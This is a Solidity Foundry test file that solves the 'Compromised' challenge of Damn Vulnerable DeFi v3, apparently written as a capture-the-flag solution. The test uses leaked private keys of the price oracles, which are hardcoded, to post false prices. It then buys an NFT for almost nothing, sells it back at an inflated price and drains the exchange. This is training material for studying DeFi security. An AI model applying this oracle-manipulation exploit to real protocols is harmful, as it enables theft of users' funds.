// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Challenge} from "./utils/Challenge.sol";

import {Exchange} from "dvd-v3/compromised/Exchange.sol";
import {TrustfulOracle} from "dvd-v3/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "dvd-v3/compromised/TrustfulOracleInitializer.sol";

contract Compromised is Challenge {
    Exchange internal exchange;
    TrustfulOracle internal oracle;

    address[] internal sources;
    string[] internal names;
    uint256[] internal prices;

    uint256 constant EXCHANGE_INITIAL_ETH_BALANCE = 999e18;
    uint256 constant INITIAL_NFT_PRICE = 999e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e17;
    uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2e18;

    function setUp() public {
        newActors(PLAYER_INITIAL_ETH_BALANCE, 1e18);
        assertEq(attacker.balance, PLAYER_INITIAL_ETH_BALANCE);

        sources.push(0xA73209FB1a42495120166736362A1DfA9F95A105);
        sources.push(0xe92401A4d3af5E446d93D11EEc806b1462b39D15);
        sources.push(0x81A5D6E50C214044bE44cA0CB057fe119097850c);

        for(uint8 i=0; i<3; ++i) {
            deal(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
            assertEq(sources[i].balance, TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
            names.push("DVNFT");
            prices.push(INITIAL_NFT_PRICE);
        }

        vm.startPrank(deployer);
        oracle = new TrustfulOracleInitializer(sources, names, prices).oracle();
        exchange = new Exchange(address(oracle));
        dvnft = exchange.token();
        vm.stopPrank();
        deal(address(exchange), EXCHANGE_INITIAL_ETH_BALANCE);
        assertEq(dvnft.owner(), address(0));
        assertEq(dvnft.rolesOf(address(exchange)), dvnft.MINTER_ROLE());
        vm.label(sources[0], "Oracle 1");
        vm.label(sources[1], "Oracle 2");
        vm.label(sources[2], "Oracle 3");
        vm.label(address(oracle), "Oracle Contract");
        vm.label(address(exchange), "Exchange");
        vm.label(address(dvnft), "DVNFT");

    }

    function test_ExploitCompromised() public {
        // leaked info: Hex -> utf8 -> encodeBase64
        // 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
        // 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
        uint256 privateKey = 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48;
        address addr = vm.addr(privateKey);
        assertEq(addr, sources[2]);
        privateKey = 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9;
        addr = vm.addr(privateKey);
        assertEq(addr, sources[1]);

        set_prices(0);

        vm.startPrank(attacker);
        exchange.buyOne{value: PLAYER_INITIAL_ETH_BALANCE}();
        vm.stopPrank();

        set_prices(EXCHANGE_INITIAL_ETH_BALANCE);

        vm.startPrank(attacker);
        exchange.token().approve(address(exchange), 0);
        exchange.sellOne(0);
        vm.stopPrank();
        set_prices(INITIAL_NFT_PRICE);
        validation();
    }

    function set_prices(uint256 amount) public {
        vm.startPrank(sources[2]);
        oracle.postPrice(dvnft.symbol(), amount);
        vm.stopPrank();
        vm.startPrank(sources[1]);
        oracle.postPrice(dvnft.symbol(), amount);
        vm.stopPrank();
    }

    function validation() public override {
        assertEq(address(exchange).balance, 0);
        assertGt(attacker.balance, EXCHANGE_INITIAL_ETH_BALANCE);
        assertEq(dvnft.balanceOf(attacker), 0);
        assertEq(oracle.getMedianPrice(dvnft.symbol()), INITIAL_NFT_PRICE);
    }
}